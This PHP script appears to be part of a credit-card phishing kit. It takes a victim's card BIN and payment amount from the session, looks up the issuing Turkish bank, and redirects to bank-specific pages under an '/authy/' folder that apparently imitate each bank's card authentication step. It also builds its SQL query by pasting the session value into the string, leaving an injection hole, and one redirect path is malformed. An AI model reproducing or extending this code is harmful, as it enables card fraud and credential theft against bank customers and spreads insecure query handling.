<?php
include(__DIR__ . "/Core/getRealIPAdress.php");
include(__DIR__ . "/Connection.php");
$ip = getUserIP();
 ob_start(); 
session_start();
$bin = $_SESSION['cc_first_6'];
$tutar = $_SESSION['tutar'];



	//	echo '<script type="text/javascript">alert("'.$_SESSION['cc_first_6'].'");</script>';


$kontrol = $db->query("SELECT * FROM banklist WHERE PrefixNo = '$bin'")->fetch(PDO::FETCH_ASSOC);

	
	
			echo '<script type="text/javascript">alert("'.$kontrol['MemberName'].'");</script>';

		
		
		// $binkontrol = "".$sorgulabin['MemberName']." - ".$sorgulabin['CardType']." - ".$sorgulabin['SubType']."";
	
	
	
    if($kontrol['MemberName'] == 'GARANTI'){ 
        header('Location:/authy/garanti.php');
    } else if($kontrol['MemberName'] == 'YAPI KREDI') {
        header('Location:/authy/yapikredi.php');
    } else if($kontrol['MemberName'] == 'FINANSBANK') {
        header('Location:/authy/finansbank.php');
    } else if($kontrol['MemberName'] == 'YAPI VE KREDI BANKASI, A.S.') {
        header('Location:/authy/yapikredi.php');
    } else if($kontrol['MemberName'] == 'AKBANK T.A.S.') {
        header('Location:/authy/akbank.php');
    } else if($kontrol['MemberName'] == 'AKBANK') {
        header('Location:/authy/akbank.php');
    } else if($kontrol['MemberName'] == 'TURKIYE GARANTI BANKASI A. S.') {
        header('Location:/authy/garanti.php');
    }else if($kontrol['MemberName'] == 'T. GARANTİ BANKASI A.Ş.') {
        header('Location:/authy/garanti.php');
    }else if($kontrol['MemberName'] == 'TURKIYE IS BANKASI') {
        header('Location:/authy/isbankasi.php');
    } else if($kontrol['MemberName'] == 'TURKIYE IS BANKASI, A.S.') {
        header('Location:/authy/isbankasi.php');
    } else if($kontrol['MemberName'] == 'ING BANK, A.S.') {
        header('Location:/authy/ing.php');
    } else if($kontrol['MemberName'] == 'TURKIYE HALK BANKASI, A.S.') {
        header('Location://halkbank.php');
    } else if($kontrol['MemberName'] == 'T.C. ZIRAAT BANKASI, A.S.') {
        header('Location:/authy/ziraat.php');
    }else if($kontrol['MemberName'] == 'T.C. ZİRAAT BANKASI A.Ş.') {
        header('Location:/authy/ziraat.php');
    } else {
        header('Location:/authy/other.php');
    }


?>